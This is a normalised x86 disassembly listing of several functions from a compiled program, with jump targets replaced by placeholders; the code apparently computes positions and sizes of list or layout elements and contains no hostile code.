mov eax [ ebx + 0x39 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebx + 0x3d ]
mov [ ebp - 0x38 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x40 ] eax
jmp r-xdata
cmp [ ebp - 0x41 ] 0x0
je r-xdata
mov eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
mov ecx [ ebx + 0x20 ]
mov edx [ ebx + 0x1a ]
mov eax [ ebx + 0x16 ]
call sub_4125bc
mov eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x3d ]
mov eax [ ebx + 0x39 ]
call sub_4125bc
jmp r-xdata
mov eax [ ebx ]
cmp eax [ ebp - 0xc ]
jne r-xdata
inc [ ebp - 0x48 ]
jmp r-xdata
mov eax [ ebp - 0x50 ]
cmp eax [ ebp - 0x54 ]
je r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
cmp eax [ ebp - 0x1c ]
jle r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x28 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x3c ]
cmp eax [ ebp - 0x20 ]
jge r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
lea ecx [ ebp - 0xa8 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0xcc ]
mov eax [ ebp - 0xa0 ]
sub eax [ ebp - 0xa8 ]
mov [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebp - 0x41 ] 0x0
je r-xdata
mov eax [ ebp - 0x48 ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x54 ]
call sub_4139c8
mov ebx eax
xor eax eax
mov [ ebx + 0x39 ] eax
mov eax [ ebx + 0x20 ]
mov [ ebx + 0x44 ] eax
mov [ ebx + 0x38 ] 0x1
inc [ ebp - 0x4c ]
push ebp
mov ecx [ ebx + 0x44 ]
lea edx [ ebx + 0x39 ]
mov eax ebx
call sub_429cac
pop ecx
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
sub [ ebp - 0x1c ] eax
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
sub eax [ ebp - 0x1c ]
sub [ ebx + 0x44 ] eax
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x14 ]
add eax [ ebx + 0x4 ]
add eax [ ebx + 0xc ]
cmp eax [ ebx + 0x44 ]
jle r-xdata
dec [ ebp - 0x14 ]
inc [ ebp - 0x74 ]
jne r-xdata
mov eax [ ebx + 0x39 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x28 ]
sub [ ebx + 0x39 ] eax
mov eax [ ebx + 0x44 ]
sub [ ebp - 0x1c ] eax
push ebp
mov ecx [ ebx + 0x44 ]
lea edx [ ebx + 0x39 ]
mov eax ebx
call sub_429cac
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x28 ]
cmp eax [ ebp - 0x60 ]
jg r-xdata
mov eax [ ebp - 0x38 ]
cmp eax [ ebp - 0x30 ]
je r-xdata
cmp [ ebp - 0x6d ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x60 ] eax
mov edi [ ebp - 0x14 ]
dec edi
mov eax [ ebp - 0x50 ]
sub eax edi
jg r-xdata
mov eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
mov ecx [ ebx + 0x20 ]
mov edx [ ebx + 0x1a ]
mov eax [ ebx + 0x16 ]
call sub_4125bc
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x44 ]
mov eax [ ebp - 0x10 ]
sub edx [ eax + 0x4 ]
sub edx [ ebx + 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x40 ]
mov ecx [ ebp - 0x10 ]
sub eax [ ecx ]
sub eax [ ebx + 0x4 ]
lea ecx [ ebp - 0xb0 ]
call sub_41256c
mov eax [ ebp - 0xb0 ]
mov [ ebx + 0x39 ] eax
mov eax [ ebp - 0xac ]
mov [ ebx + 0x3d ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x48 ]
add eax [ ebx + 0x4 ]
add eax [ ebx + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x3d ]
mov eax [ ebx + 0x39 ]
call sub_4125bc
jmp r-xdata
mov esi [ ebx + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x14 ]
call sub_4139c8
mov ebx eax
mov esi [ ebx ]
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
cmp eax [ ebp - 0x1c ]
jle r-xdata
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x14 ]
add eax [ ebx + 0x4 ]
add eax [ ebx + 0xc ]
mov [ ebx + 0x44 ] eax
mov esi [ ebx + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x24 ]
add eax [ ebp - 0x38 ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x3c ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x64 ]
cmp eax [ ebp - 0x24 ]
jle r-xdata
dec eax
mov [ ebp - 0x7c ] eax
mov eax esi
mov edx [ ebx + 0x39 ]
mov [ eax + 0x39 ] edx
mov edx [ ebx + 0x3d ]
mov [ eax + 0x3d ] edx
mov edx [ eax + 0x30 ]
mov edx [ edx + 0x24 ]
add [ eax + 0x3d ] edx
mov edx [ ebx + 0x44 ]
mov [ eax + 0x44 ] edx
mov esi [ eax + 0x34 ]
test esi esi
jne r-xdata
push ebp
mov ecx [ ebx + 0x44 ]
lea edx [ ebx + 0x39 ]
mov eax ebx
call sub_429cac
pop ecx
test al al
jne r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
sub eax [ ebp - 0x1c ]
sub [ ebx + 0x39 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
cmp eax [ ebx + 0x39 ]
jle r-xdata
mov eax esi
mov edx [ ebx + 0x39 ]
mov [ eax + 0x39 ] edx
mov edx [ ebx + 0x3d ]
mov [ eax + 0x3d ] edx
mov edx [ eax + 0x30 ]
mov edx [ edx + 0x24 ]
add [ eax + 0x3d ] edx
mov esi [ eax + 0x34 ]
test esi esi
jne r-xdata
mov eax [ ebp - 0x3c ]
sub eax [ ebp - 0x20 ]
add [ ebp - 0x24 ] eax
add eax [ ebp - 0x40 ]
add [ ebp - 0x20 ] eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x24 ]
add eax [ ebp - 0x38 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x64 ]
sub [ ebp - 0x24 ] eax
mov eax [ ebp - 0x64 ]
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x80 ]
mov eax [ eax + 0x39 ]
mov edx [ ebp - 0x80 ]
add eax [ edx + 0x44 ]
cmp eax [ ebp - 0x5c ]
jle r-xdata
mov eax [ ebp - 0x80 ]
mov eax [ eax ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
jmp r-xdata
mov esi [ ebx + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
mov [ ebx + 0x39 ] eax
push ebp
lea edx [ ebp - 0x3c ]
mov ecx [ ebp - 0x40 ]
mov eax ebx
call sub_429cac
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x3c ]
mov [ ebx + 0x39 ] eax
mov eax [ ebp - 0x38 ]
mov [ ebx + 0x3d ] eax
mov eax [ ebp - 0x40 ]
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov eax [ ebp - 0x80 ]
mov eax [ eax + 0x39 ]
mov edx [ ebp - 0x80 ]
add eax [ edx + 0x44 ]
sub eax [ ebp - 0x5c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
dec eax
cmp edi eax
jge r-xdata
dec edi
inc [ ebp - 0x7c ]
jne r-xdata
mov eax esi
mov edx [ ebx + 0x16 ]
mov [ eax + 0x16 ] edx
mov edx [ ebx + 0x1a ]
mov [ eax + 0x1a ] edx
mov edx [ ebx + 0x39 ]
mov [ eax + 0x39 ] edx
mov edx [ ebx + 0x3d ]
mov [ eax + 0x3d ] edx
mov edx [ eax + 0x30 ]
mov edx [ edx + 0x24 ]
add [ eax + 0x3d ] edx
mov edx [ ebx + 0x44 ]
mov [ eax + 0x44 ] edx
mov esi [ eax + 0x34 ]
test esi esi
jne r-xdata
cmp [ ebx + 0x15 ] 0x0
jne r-xdata
mov esi [ ebx + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x60 ]
jle r-xdata
mov eax [ ebp - 0x80 ]
mov eax [ eax + 0x39 ]
mov edx [ ebp - 0x80 ]
add eax [ edx + 0x44 ]
mov edx [ ebp - 0x64 ]
sub edx eax
sub [ ebp - 0x60 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_4139c8
mov [ ebp - 0x80 ] eax
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x39 ]
cmp eax [ ebp - 0x3c ]
jge r-xdata
mov eax esi
mov edx [ ebx + 0x16 ]
mov [ eax + 0x16 ] edx
mov edx [ ebx + 0x1a ]
mov [ eax + 0x1a ] edx
mov edx [ ebx + 0x39 ]
mov [ eax + 0x39 ] edx
mov edx [ ebx + 0x3d ]
mov [ eax + 0x3d ] edx
mov edx [ eax + 0x30 ]
mov edx [ edx + 0x24 ]
add [ eax + 0x1a ] edx
mov edx [ eax + 0x30 ]
mov edx [ edx + 0x24 ]
add [ eax + 0x3d ] edx
mov edx [ ebx + 0x20 ]
mov [ eax + 0x20 ] edx
mov edx [ ebx + 0x44 ]
mov [ eax + 0x44 ] edx
mov esi [ eax + 0x34 ]
test esi esi
jne r-xdata
mov eax [ ebp - 0x80 ]
mov eax [ eax + 0x39 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x80 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0x39 ] edx
mov eax [ ebp - 0x80 ]
mov eax [ eax + 0x44 ]
sub [ ebp - 0x5c ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_4139c8
mov esi eax
push ebp
mov ecx [ esi + 0x44 ]
lea edx [ esi + 0x39 ]
mov eax esi
call sub_429cac
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x3c ]
mov [ ebx + 0x39 ] eax
mov eax [ ebp - 0x38 ]
mov [ ebx + 0x3d ] eax
mov eax [ ebp - 0x40 ]
mov [ ebx + 0x44 ] eax
mov eax [ ebp - 0x80 ]
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_4139c8
mov edx [ eax + 0x16 ]
mov [ esi + 0x16 ] edx
mov edx [ eax + 0x1a ]
mov [ esi + 0x1a ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_4139c8
mov edx [ eax + 0x39 ]
mov [ esi + 0x39 ] edx
mov edx [ eax + 0x3d ]
mov [ esi + 0x3d ] edx
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x24 ]
add [ esi + 0x1a ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x24 ]
add [ esi + 0x3d ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_4139c8
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_4139c8
mov eax [ eax + 0x44 ]
mov [ esi + 0x44 ] eax
mov esi [ esi + 0x34 ]
test esi esi
jne r-xdata
sub_42a828
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41386c
inc edi
xor esi esi
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_413a44
jmp r-xdata
mov edx [ ebx + 0x44 ]
cmp edx [ eax + 0x44 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
dec edi
jne r-xdata
mov edx [ ebx + 0x40 ]
cmp edx [ eax + 0x40 ]
jge r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4139c8
mov edx [ ebx + 0x44 ]
cmp edx [ eax + 0x44 ]
jl r-xdata
sub_42a888
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x5 ] 0x0
mov [ ebp - 0x35 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x2c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x34 ] eax
xor edx edx
push ebp
push sub_42ac35
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax ebx
call sub_441428
mov edx eax
mov eax [ ebp - 0x20 ]
call sub_413b2c
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x21 ] 0x0
mov eax ebx
call sub_441428
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0xc ] 0x0
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0xc ] 0x0
mov al 0x1
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x34 ]
push eax
push 0x0
mov al [ ebp - 0x35 ]
push eax
push rw-data
push 0xffffffff
push 0xffffffff
push 0x1
lea ecx [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42afc4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4139c8
lea edx [ ebp - 0x5c ]
call sub_43d864
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x34 ]
push eax
push 0x0
mov al [ ebp - 0x35 ]
push eax
push rw-data
push 0xffffffff
push 0xffffffff
push 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4139c8
mov edx eax
lea ecx [ ebp - 0x5c ]
mov eax ebx
call sub_42afc4
inc [ ebp - 0xc ]
dec [ ebp - 0x3c ]
jne r-xdata
test [ ebx + 0x1c ] 0x10
setne al
and al [ ebp - 0x19 ]
je r-xdata
inc edi
xor esi esi
xor eax eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ac3c
mov eax [ ebp - 0x20 ]
call sub_40326c
mov eax [ ebp - 0x2c ]
call sub_40326c
mov eax [ ebp - 0x30 ]
call sub_40326c
mov eax [ ebp - 0x34 ]
call sub_40326c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebp - 0x19 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc esi
dec edi
jne r-xdata
mov eax [ ebx + 0x228 ]
mov edx esi
call sub_4139c8
mov eax [ eax ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov [ ebp - 0x22 ] al
mov [ ebp - 0x19 ] 0x0
mov eax [ ebx + 0x228 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov [ ebp - 0x19 ] 0x0
mov edi [ ebx + 0x228 ]
mov eax edi
mov edx esi
call sub_4139c8
mov edx eax
mov eax edi
call sub_429b18
mov eax [ ebx + 0x228 ]
mov edx esi
call sub_4139c8
cmp [ eax + 0x30 ] 0x0
jne r-xdata
cmp [ ebp - 0x21 ] 0x0
jne r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x3c ]
jne r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
mov eax [ ebx + 0x228 ]
mov edx esi
call sub_4139c8
mov [ ebp - 0x28 ] eax
mov edi [ ebp - 0x28 ]
mov edx [ edi + 0x8 ]
add edx [ edi + 0x10 ]
mov eax [ ebp - 0x34 ]
call sub_41386c
cmp [ ebx + 0x218 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0x228 ]
mov edx esi
call sub_4139c8
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4413ec
mov [ ebp - 0x18 ] eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
call sub_42a828
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x4c ]
mov eax [ edi ]
call sub_43d864
mov eax [ edi + 0x1a ]
add eax [ edi + 0x8 ]
mov edx [ edi ]
add eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x4c ]
push eax
mov ecx [ edi + 0x16 ]
add ecx [ edi + 0x20 ]
sub ecx [ edi + 0xc ]
mov eax [ edi + 0x1a ]
add eax [ edi + 0x8 ]
push eax
mov eax [ edi + 0x16 ]
add eax [ edi + 0x4 ]
pop edx
call sub_412594
jmp r-xdata
xor eax eax
jmp r-xdata
xor edx edx
mov dl [ ebp - 0x11 ]
mov eax [ ebp - 0x2c ]
call sub_41386c
mov edx esi
mov eax [ ebp - 0x30 ]
call sub_41386c
mov eax [ ebp - 0x28 ]
mov edi [ eax + 0x34 ]
test edi edi
je r-xdata
lea eax [ esi + 0x1 ]
mov edx [ ebx + 0x228 ]
cmp eax [ edx + 0x8 ]
jge r-xdata
mov al [ edi + 0x15 ]
mov [ ebp - 0x11 ] al
cmp [ ebp - 0x11 ] 0x0
je r-xdata
cmp al [ ebp - 0x22 ]
setne [ ebp - 0x21 ]
mov eax [ ebx + 0x228 ]
mov edx esi
call sub_4139c8
mov dl [ ebp - 0x22 ]
mov [ eax + 0x14 ] dl
mov [ ebp - 0x19 ] 0x1
jmp r-xdata
mov eax [ ebx + 0x228 ]
mov edx [ ebp - 0x28 ]
call sub_429b18
jmp r-xdata
mov eax [ ebx + 0x228 ]
mov edx edi
call sub_413a24
mov esi eax
xor edx edx
mov dl [ edi + 0x15 ]
mov eax [ ebp - 0x2c ]
call sub_41386c
mov edx esi
mov eax [ ebp - 0x30 ]
call sub_41386c
mov eax edi
mov edx [ eax + 0x8 ]
add edx [ eax + 0x10 ]
mov eax [ ebp - 0x34 ]
call sub_41386c
cmp [ edi + 0x15 ] 0x0
je r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x228 ]
call sub_4139c8
mov edi eax
cmp [ edi + 0x15 ] 0x0
jne r-xdata
mov edi [ edi + 0x34 ]
test edi edi
jne r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x228 ]
cmp edx [ eax + 0x8 ]
jge r-xdata
mov [ edi + 0x15 ] 0x1
mov [ edi + 0x38 ] 0x1
mov [ ebp - 0x35 ] 0x1
lea edx [ esi + 0x1 ]
call sub_4139c8
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ eax + 0x15 ] 0x1
sub_42ac6c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov ebp eax
mov eax [ ebp + 0x228 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax [ ebp + 0x228 ]
mov edx esi
call sub_4139c8
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x228 ]
mov edx esi
call sub_4139c8
test eax eax
je r-xdata
lea edx [ esp + 0x8 ]
mov eax [ ebx ]
call sub_43d864
mov eax [ esp + 0x8 ]
mov [ ebx + 0x16 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1a ] eax
mov eax [ ebx + 0x4 ]
sub [ ebx + 0x16 ] eax
mov eax [ ebx + 0x8 ]
sub [ ebx + 0x1a ] eax
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x1a ]
mov eax [ ebx + 0x30 ]
add edx [ eax + 0x24 ]
mov ecx esp
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x16 ]
call sub_41256c
mov eax [ esp ]
mov [ ebx + 0x16 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1a ] eax
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x48 ]
add eax [ ebx + 0x4 ]
add eax [ ebx + 0xc ]
mov [ ebx + 0x20 ] eax
mov al [ ebx + 0x38 ]
mov [ ebx + 0x15 ] al
sub_42ad24
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] ecx
mov ebp edx
mov ebx eax
mov [ esp + 0x4 ] 0x1
mov eax ebx
call sub_4449fc
test al al
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax ebx
call sub_441428
test eax eax
jle r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ ebx + 0x228 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
mov [ ebp ] eax
mov eax [ ebx + 0x228 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebx
call sub_43d90c
mov edx [ ebx + 0x4c ]
sub edx eax
mov eax [ esp ]
add [ eax ] edx
inc esi
xor edi edi
mov eax ebx
call sub_43d8c8
mov edx [ ebx + 0x48 ]
sub edx eax
add [ ebp ] edx
jmp r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
inc edi
dec esi
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx edi
mov eax [ ebx + 0x228 ]
call sub_4139c8
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx [ eax + 0x3d ]
mov ecx [ eax ]
add edx [ ecx + 0x4c ]
add edx [ eax + 0x8 ]
add edx [ eax + 0x10 ]
mov ecx [ esp ]
cmp edx [ ecx ]
jle r-xdata
mov edx [ eax ]
cmp [ edx + 0x57 ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x228 ]
call sub_4139c8
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx [ eax ]
mov edx [ edx + 0x48 ]
add edx [ eax + 0x39 ]
add edx [ eax + 0x4 ]
add edx [ eax + 0xc ]
cmp edx [ ebp ]
jle r-xdata
mov edx [ eax ]
cmp [ edx + 0x57 ] 0x0
je r-xdata
mov eax [ esp ]
mov [ eax ] edx
mov edx [ eax ]
mov edx [ edx + 0x48 ]
add edx [ eax + 0x39 ]
add edx [ eax + 0x4 ]
add edx [ eax + 0xc ]
mov [ ebp ] edx
sub_42ae48
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x5 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x10 ]
mov edx [ edx + 0x228 ]
cmp eax [ edx + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x15 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x1d ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x230 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x228 ]
call sub_4139c8
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x11 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x228 ]
mov ecx ebx
call sub_413a44
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x1
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov [ eax + 0x34 ] ebx
mov edx [ ebp + 0x8 ]
add edx 0xffffffdf
push edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x19 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x21 ]
push edx
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffc7
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov cl [ eax - 0x29 ]
mov eax [ ebp + 0x8 ]
mov dl [ eax - 0x5 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_429a98
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
cmp [ ebx + 0x15 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
dec [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x230 ]
mov edx [ ebp + 0x8 ]
add [ edx - 0x1d ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x28 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x20 ]
push eax
push ebx
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffc7
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
push 0x0
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x21 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_42afc4
mov [ ebx + 0x15 ] 0x0
mov [ ebx + 0x38 ] 0x0
sub_42afc4
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov esi [ ebp + 0x14 ]
lea edi [ ebp - 0x39 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x214 ] edx
mov eax [ ebp + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x0
xor edx edx
mov eax [ ebp + 0x28 ]
call sub_4139c8
mov [ ebp - 0x4d ] al
xor edx edx
mov eax [ ebp + 0x28 ]
call sub_4138b8
jmp r-xdata
mov [ ebp - 0xc ] 0xffffffff
xor edx edx
mov eax [ ebp + 0x24 ]
call sub_4139c8
mov [ ebp - 0xc ] eax
xor edx edx
mov eax [ ebp + 0x24 ]
